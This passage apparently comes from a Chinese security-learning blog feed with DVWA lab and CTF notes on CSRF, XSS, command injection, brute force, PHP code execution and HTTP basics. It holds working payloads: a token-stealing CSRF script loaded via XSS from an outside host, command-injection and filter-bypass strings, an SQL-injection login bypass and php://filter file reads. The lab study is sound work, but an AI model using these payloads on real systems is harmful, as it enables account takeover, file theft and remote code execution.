href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h2><p>检查一下源代码，防线多了个token</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 检测用户的 user_token</span><br><span class="line">checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br></pre></td></tr></table></figure><p>相对于 Low 级别，实际上就是增加了一个 token 检测，这样我们 CSRF 攻击的时候必须知道用户的 token 才可以成功。</p><p>通关思路：使用 XSS 来获取用户的 token ，然后将 token 放到 CSRF 的请求中。因为 HTML 无法跨域，这里我们尽量使用原生的 JS 发起 HTTP 请求才可以。</p><p>1.首先新建csrf.js</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 首先访问这个页面 来获取 token</span><br><span class="line">var tokenUrl = &#x27;http://127.0.0.1:8888/vulnerabilities/csrf/&#x27;;</span><br><span class="line"></span><br><span class="line">if(window.XMLHttpRequest) &#123;</span><br><span class="line">    xmlhttp = new XMLHttpRequest();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var count = 0;</span><br><span class="line">xmlhttp.withCredentials = true;</span><br><span class="line">xmlhttp.onreadystatechange=function()&#123;</span><br><span class="line">    if(xmlhttp.readyState ==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">          // 使用正则提取 token</span><br><span class="line">        var text = xmlhttp.responseText;</span><br><span class="line">        var regex = /user_token\&#x27; value\=\&#x27;(.*?)\&#x27; \/\&gt;/;</span><br><span class="line">        var match = text.match(regex);</span><br><span class="line">        var token = match[1];</span><br><span class="line">          // 发起 CSRF 请求 将 token 带入</span><br><span class="line">        var new_url = &#x27;http://127.0.0.1:8888/vulnerabilities/csrf/?user_token=&#x27;+token+&#x27;&amp;password_new=111&amp;password_conf=111&amp;Change=Change&#x27;;</span><br><span class="line">        if(count==0)&#123;</span><br><span class="line">            count++;</span><br><span class="line">            xmlhttp.open(&quot;GET&quot;,new_url,false);</span><br><span class="line">            xmlhttp.send();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlhttp.open(&quot;GET&quot;,tokenUrl,false);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure><p>然后将文件放在外网的服务器上，然后访问网页，直接发起xss测试，这里直接通过 script 标签的 src 来引入外部 js，访问之后此时密码就被更改为 111 了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8888/vulnerabilities/xss_d/?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;script src=&quot;http://www.sqlsec.com/csrf.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> web dvwa </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> dvwa </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>dvwa CE</title>
+      <link href="/2023/11/28/day999/"/>
+      <url>/2023/11/28/day999/</url>
+      
+        <content type="html"><![CDATA[<h1 id="命令注入-Command-Injection"><a href="#命令注入-Command-Injection" class="headerlink" title="命令注入(Command Injection)"></a>命令注入(Command Injection)</h1><h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>Command Injection（命令注入），就是指通过提交一些恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>源代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">    // 确定操作系统并执行ping命令</span><br><span class="line">    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">        // Windows</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // *nix</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过代码可以发现，服务器仅仅只是判断了不同的操作系统执行不同的命令，并没有做其他的限制</p><p>注：操作符的使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A;B A 不论正确与否都会执行 B 命令</span><br><span class="line">A&amp;B A 后台运行，A 和 B 同时执行</span><br><span class="line">A&amp;&amp;B A 执行成功时候才会执行 B 命令</span><br><span class="line">A|B A 执行的输出结果，作为 B 命令的参数，A 不论正确与否都会执行 B 命令</span><br><span class="line">A||B A 执行失败后才会执行 B 命令</span><br></pre></td></tr></table></figure><p>运行127.0.0.1&amp;ls查看目录</p><p><img src="https://skymirror-1322372781.cos.ap-beijing.myqcloud.com/image-20231128184610117.png" alt="image-20231128184610117"></p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>源代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Set blacklist</span><br><span class="line">//设置命令黑名单，里面包含&amp;&amp;和；</span><br><span class="line">    $substitutions = array(</span><br><span class="line">        &#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // Remove any of the charactars in the array (blacklist).</span><br><span class="line">//将参数中有&amp;&amp;和；的都替换成空</span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">        // Windows</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // *nix</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>从源码中可以看出，相比于Low难度，增加了黑名单，将 “&amp;&amp;”，”;” 做了限制，将其改成空格，但是别的没有什么改变，在这里依旧可以通过 127.0.0.1 &amp; ipconfig 来绕过</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>源代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $target = trim($_REQUEST[ &#x27;ip&#x27; ]);</span><br><span class="line"></span><br><span class="line">    // Set blacklist</span><br><span class="line">//设置命令黑名单，里面包含&amp; ；| - $ ( ) \ &#x27; ||</span><br><span class="line">    $substitutions = array(</span><br><span class="line">        &#x27;&amp;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;| &#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;-&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;$&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;(&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;)&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;`&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;||&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // Remove any of the charactars in the array (blacklist).</span><br><span class="line">//替换成空</span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">        // Windows</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // *nix</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看到代码，发现黑名单中的限制更多了，像 ‘&amp;’，’| ‘，’||’，’;’，’$’ 等许多都加了限制，但是要仔细观察 ，比如说这个 ‘| ‘ ，它是在管道符后面加了个空格，因此考虑使用 127.0.0.1 |ipconfig 来绕过</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web dvwa </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> dvwa </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>dvwa BF</title>
+      <link href="/2023/11/27/day333/"/>
+      <url>/2023/11/27/day333/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Brute-Force-暴力破解"><a href="#Brute-Force-暴力破解" class="headerlink" title="Brute Force 暴力破解"></a>Brute Force 暴力破解</h2><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>1.手工注入 万能密码</p><p>admin ‘ or ‘1’&#x3D;’1</p><p>2.直接bp爆破</p><p>welcome to dvwa</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>这个跟low差不多 只是增加了mysqli_real_escape_string()函数 这个函数会过滤一些特殊的符号 抵御一部分sql注入</p><p>ps:mysqli_real_escape_string()函数的作用是对字符串中的特殊字符进行转义，以防止SQL注入攻击。它将字符串中的特殊字符（如单引号、双引号、反斜杠等）转义为它们的转义序列，从而使其在SQL语句中不被误解为SQL命令的一部分。这样可以确保用户输入的数据不会破坏SQL查询语句的结构，同时保护数据库的安全性。</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>这一关的区别在于token</p><p>注：Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web dvwa </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> dvwa </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CTF中命令执行绕过方法</title>
+      <link href="/2023/11/23/day6/"/>
+      <url>/2023/11/23/day6/</url>
+      
+        <content type="html"><![CDATA[<h1 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a><strong>命令执行绕过</strong></h1><h2 id="escapeshellcmd函数绕过方法："><a href="#escapeshellcmd函数绕过方法：" class="headerlink" title="escapeshellcmd函数绕过方法："></a>escapeshellcmd函数绕过方法：</h2><p>1.执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。</p><p>payload&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post=../ %1a whoami</span><br></pre></td></tr></table></figure><p>2.宽字节注入</p><h2 id="空格过滤："><a href="#空格过滤：" class="headerlink" title="空格过滤："></a>空格过滤：</h2><p>1.${IFS}</p><p>payload1&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat$&#123;IFS&#125;flag</span><br></pre></td></tr></table></figure><p>payload2&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat$&#123;IFS&#125;$9flag</span><br></pre></td></tr></table></figure><p>payload3&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat$IFS$9flag</span><br></pre></td></tr></table></figure><p>2.重定向符&lt;&gt;</p><p>payload1&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat&lt;&gt;flag</span><br></pre></td></tr></table></figure><p>payload2&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat&lt;flag</span><br></pre></td></tr></table></figure><h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><p>1.拼接</p><p>payload&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=c;b=at;c=flag;$a$b $c</span><br></pre></td></tr></table></figure><p>2.利用已存在的资源</p><p>从已有的文件或者环境变量中获得相应的字符。</p><p>3.base64编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`echo &quot;Y2F0IGZsYWc=&quot;|base64 -d`</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash</span><br></pre></td></tr></table></figure><p>4.单引号、双引号</p><p>payload1&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&quot;&quot;at flag</span><br></pre></td></tr></table></figure><p>payload2&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&quot;&quot;at fl&quot;&quot;ag</span><br></pre></td></tr></table></figure><p>payload3&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&quot;&quot;at fl&#x27;&#x27;ag</span><br></pre></td></tr></table></figure><p>5.反斜线 \</p><p>payload&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure><p>6.LINUX下一些已有字符</p><ul><li>${PS2} 对应字符 ‘&gt;’</li><li>${PS4} 对应字符 ‘+’</li><li>${IFS} 对应 内部字段分隔符</li><li>${9} 对应 空字符串</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> web php </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> php </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>xss攻击基础了解</title>
+      <link href="/2023/11/23/day7/"/>
+      <url>/2023/11/23/day7/</url>
+      
+        <content type="html"><![CDATA[<h1 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h1><h2 id="XSS的了解"><a href="#XSS的了解" class="headerlink" title="XSS的了解"></a>XSS的了解</h2><p>跨站脚本攻击（Cross-site scripting，XSS）是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。若受害者运行这些恶意代码，攻击者就可以突破网站的访问限制并冒充受害者。根据开放式 Web 应用安全项目（OWASP），XSS 在 2017 年被认为 <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_(XSS)">7 种最常见的 Web 应用程序漏洞之一</a>。</p><p>如果 Web 应用程序没有部署足够的安全验证，那么，这些攻击很容易成功。浏览器无法探测到这些恶意脚本是不可信的，所以，这些脚本可以任意读取 cookie，session tokens，或者其他敏感的网站信息，或者让恶意脚本重写<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/HTML">HTML</a>内容。</p><p>在以下 2 种情况下，容易发生 XSS 攻击：</p><ol><li><p>数据从一个不可靠的链接进入到一个 Web 应用程序。</p></li><li><p>没有过滤掉恶意代码的动态内容被发送给 Web 用户。</p><p>恶意内容一般包括 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/JavaScript">JavaScript</a>，但是，有时候也会包括 HTML，FLASH 或是其他浏览器可执行的代码。XSS 攻击的形式千差万别，但他们通常都会：将 cookies 或其他隐私信息发送给攻击者，将受害者重定向到由攻击者控制的网页，或是经由恶意网站在受害者的机器上进行其他恶意操作。</p><p>XSS 攻击可以分为 3 类：存储型（持久型）、反射型（非持久型）、DOM 型。</p><ul><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting#%E5%AD%98%E5%82%A8%E5%9E%8B_xss"><strong>存储型 XSS</strong></a></p><p>注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting#%E5%8F%8D%E5%B0%84%E5%9E%8B_xss"><strong>反射型 XSS</strong></a></p><p>当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web 服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自”可信任”的服务器，所以会执行这段脚本。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting#%E5%9F%BA%E4%BA%8E_dom_%E7%9A%84_xss"><strong>基于 DOM 的 XSS</strong></a></p><p>通过修改原始的客户端代码，受害者浏览器的 DOM 环境改变，导致有效载荷的执行。也就是说，页面本身并没有变化，但由于 DOM 环境被恶意修改，有客户端代码被包含进了页面，并且意外执行。</p></li></ul></li></ol><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>XSS和SQLI、RCE本质上都是注入类漏洞，核心要义都是构造payload逃逸程序原有的处理逻辑进而欺骗目标系统执行恶意代码。</p><p>XSS将恶意代码注入到网页中，使用户加载并执行攻击者恶意制造的网页程序。恶意代码通常是JavaScript、Java组件，VBScript，ActiveX，Flash或者就是原生的HTML。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web xss </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> host </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>web day2</title>
+      <link href="/2023/11/20/day3/"/>
+      <url>/2023/11/20/day3/</url>
+      
+        <content type="html"><![CDATA[<h1 id="http协议与https协议"><a href="#http协议与https协议" class="headerlink" title="http协议与https协议"></a>http协议与https协议</h1><h2 id="http简介"><a href="#http简介" class="headerlink" title="http简介"></a>http简介</h2><p>1.HTTP 协议是 Hyper Text Transfer Protocol（超文本传输协议）的缩写，是用于从万维网（ WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议.</p><p>2.http协议是基于tcp&#x2F;ip协议来传输数据（html文件、图片文件、查询结果等）</p><p>3.http的url是由http:&#x2F;&#x2F;起始，默认使用端口为80</p><h2 id="http工作原理"><a href="#http工作原理" class="headerlink" title="http工作原理"></a>http工作原理</h2><p>1.http协议工作于客户端-服务器架构上</p><p>2.浏览器作为http客户端通过url向http服务端即web服务器发送所有的请求。</p><p>3.web服务器接受到请求后，向客户端发送响应信息</p><p>4.http的默认端口号为80，但可以改为其他的端口</p><p><img src="https://www.runoob.com/wp-content/uploads/2013/11/cgiarch.gif" alt="cgiarch"></p><p>http协议的工作原理示意图</p><h1 id="https简介"><a href="#https简介" class="headerlink" title="https简介"></a>https简介</h1><p>https经由http进行通信，但是利用ssl&#x2F;tls来加密数据包，https的开发的主要目的是提供对网站服务器的身份认证，保护交换资料的隐私和完整性。</p><p>https的url是由https:&#x2F;&#x2F;起始，默认端口为443</p><h2 id="https的作用"><a href="#https的作用" class="headerlink" title="https的作用"></a>https的作用</h2><p>信任的情况：</p><p>与一个网站之间的 HTTPS 连线仅在这些情况下可被信任：</p><ul><li>浏览器正确地实现了 HTTPS 且操作系统中安装了正确且受信任的证书颁发机构；</li><li>证书颁发机构仅信任合法的网站；</li><li>被访问的网站提供了一个有效的证书，也就是说它是一个由操作系统信任的证书颁发机构签发的（大部分浏览器会对无效的证书发出警告）；（可以人为的添加证书，如bp的使用则需要人为的给浏览器添加证书）</li><li>该证书正确地验证了被访问的网站（例如，访问 <a href="https://www.runoob.com/">https://www.runoob.com</a> 时收到了签发给 <a href="http://www.runoob.com/">www.runoob.com</a> 而不是其它域名的证书）；</li><li>此协议的加密层（SSL&#x2F;TLS）能够有效地提供认证和高强度的加密。</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> web basic </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> basic </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>web day3</title>
+      <link href="/2023/11/20/day4/"/>
+      <url>/2023/11/20/day4/</url>
+      
+        <content type="html"><![CDATA[<h1 id="web基础知识"><a href="#web基础知识" class="headerlink" title="web基础知识"></a>web基础知识</h1><h2 id="php文件有以下几种备份的格式"><a href="#php文件有以下几种备份的格式" class="headerlink" title="php文件有以下几种备份的格式:"></a>php文件有以下几种备份的格式:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.git .svn .swp .bak .bash-history</span><br></pre></td></tr></table></figure><p>类如</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php.git</span><br></pre></td></tr></table></figure><h2 id="robots协议"><a href="#robots协议" class="headerlink" title="robots协议"></a>robots协议</h2><p>robots协议规定了哪些东西可以抓取，哪些东西不能够抓取。robots.txt是一个文本文件也是一个协议。其可以在搜索引擎中访问网站中要查看的第一个文件。</p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>cookie是主机访问web服务器由服务器创建的，将信息储存在用户计算机上的文件，一般用户习惯使用cookies</p><p>cookie的使用：</p><p>1..判断用户是否已经登录网站</p><p>2.购物车网站用户跳转保存在其中的数据</p><p>3.等等等</p><h2 id="php对于文件的读取"><a href="#php对于文件的读取" class="headerlink" title="php对于文件的读取"></a>php对于文件的读取</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><h3 id="组成解析"><a href="#组成解析" class="headerlink" title="组成解析"></a>组成解析</h3><p>1.php:&#x2F;&#x2F;filter&#x2F;可以作为一个中间流来处理其他流，可以进行任意文件的读取。</p><p>2.read&#x3D;convert.base64-encode&#x2F;resource将数据转换为base64编码来读取数据</p><p>3.&#x3D;index.php读取的文件</p><h3 id="添加："><a href="#添加：" class="headerlink" title="添加："></a>添加：</h3><p>读取上级目录文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=.../.../a.txt</span><br></pre></td></tr></table></figure><p>读取其他的目录文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=F：\b.txt</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> web basic </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> basic </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>php命令注入及其实例</title>
+      <link href="/2023/11/20/day5/"/>
+      <url>/2023/11/20/day5/</url>
+      
+        <content type="html"><![CDATA[<h1 id="php注入概述"><a href="#php注入概述" class="headerlink" title="php注入概述"></a>php注入概述</h1><p>rce概念：remote command&#x2F;code execute，远程命令&#x2F;代码执行。</p><p>php代码执行：在web中，php代码执行是指应用程序过滤不严，用户可通过http请求将代码注入到应用中执行</p><p>php代码注入与sql注入比较：</p><p>注入的思想类似，均是构造语句绕过服务器的过滤去执行。</p><p>区别在于sql注入是将语句注入到数据库中执行，而php代码执行是可以将代码注入到应用中，最终由服务器运行。</p><p>php代码注入的条件：</p><p>1.程序中含有可以执行php代码的函数或者语言结构</p><p>2.传入该函数或者语言结构的参数是可以由客户端控制的（可以直接修改或者造成影响）且应用过滤不严。</p><p>危害：</p><p>这样的漏洞如果没有特殊的过滤，相当于一个web后门的存在，攻击者可以执行漏洞继承web用户权限，执行任意代码。如果服务器没有正确配置或者web用户权限比较高的话，还可以读写靶机服务器任意文件的内容，甚至控制整个网站或者服务器。</p><h1 id="相关的函数或语言结构"><a href="#相关的函数或语言结构" class="headerlink" title="相关的函数或语言结构"></a>相关的函数或语言结构</h1><h2 id="1-eval-函数"><a href="#1-eval-函数" class="headerlink" title="1.eval()函数"></a>1.eval()函数</h2><p>作用：该函数的作用是将字符串作为PHP代码执行。</p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">$code=$_GET[&#x27;code&#x27;];</span><br><span class="line">eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;Please submit code!&lt;br &gt;code=phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过浏览器访问上述函数所在网页时，可以通过传递参数该code来执行PHP探针。主要方式有以下几种：<br>①普通方式提交变量：<code>?code=phpinfo();</code><br>②以语句块方式提交变量：<code>?code=&#123;phpinfo();&#125;</code><br>③以多语句方式提交参数：<code>?code=1;phpinfo();</code></p><p>payload:?code&#x3D;</p><h2 id="2-assert-函数"><a href="#2-assert-函数" class="headerlink" title="2.assert()函数"></a>2.assert()函数</h2><p>作用：该函数的作用是将字符串作为PHP代码执行。如果它的条件返回错误，则终止程序执行。</p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">$code=$_GET[&#x27;code&#x27;];</span><br><span class="line">assert($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;Please submit code!&lt;br &gt;?code=phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>普通方式提交变量：<code>?code=phpinfo()</code>或者<code>?code=phpinfo();</code><br>与eval()函数有别的是，该函数不能执行传入语句块或多语句作为参数。</p><h2 id="3-preg-replace-函数"><a href="#3-preg-replace-函数" class="headerlink" title="3.preg_replace()函数"></a>3.preg_replace()函数</h2><p>作用：该函数用于对字符串进行正则处理。</p><p>解析：preg_replace 函数一个参数是一个正则表达式，按照 php的格式，表达式在两个&#x2F;之间，如果在表达式末尾加上一个 e，则第二个参数就会被当做 php代码执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @preg_replace(&quot;/abcd/e&quot;,$_POST[&#x27;hacker&#x27;],&quot;abcdefg&quot;); ?&gt;</span><br></pre></td></tr></table></figure><p>通过浏览器访问上述函数所在网页时，可以通过传递参数该code来执行PHP探针。主要方式有以下几种：<br>①普通方式提交变量：?code&#x3D;[phpinfo();]，[]是由于preg_replace的第一个参数有分号。<br>②以语句块方式提交变量：?code&#x3D;{[phpinfo();]}<br>③以多语句方式提交参数：?code&#x3D;1;[phpinfo();]</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> web php </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> php </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>web day1</title>
+      <link href="/2023/11/16/day2/"/>
+      <url>/2023/11/16/day2/</url>
+      
+        <content type="html"><![CDATA[<p><strong>01.get&amp;&amp;post的区别：</strong></p><p>1.传送方式的不同：get通过url进行传参，而post通过dao文传输。</p><p>2.传送长度的不同：get因为通过url栏进行传参，所以其长度是有限的，受限于url栏的长度。而post则没有限制。</p><p>3.get产生一个tcp数据包，而Post产生两个数据包。</p><p>get请求，浏览器会把header和data一起发送出去，服务器响应200</p><p>post请求，浏览器会先发送header，然后服务器响应100，之后再发送data，浏览器响应200。</p><p>4.get请求是幂等的，即多次请求同一个资源会得到相同的结果，而post请求是非幂等的，即多次请求之后对同一个资源会产生不同的结果。</p><p>5.get请求通常用来获取资源，而post请求通常用来提交数据发送表单，进行状态修改等操作。</p><p>6.get请求可以缓存，可以被存为书签，可以被浏览器的历史纪录查询，而post请求则都不能。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/?...=...</span><br></pre></td></tr></table></figure><p><strong>02url栏的组成</strong></p><p>例子：<a 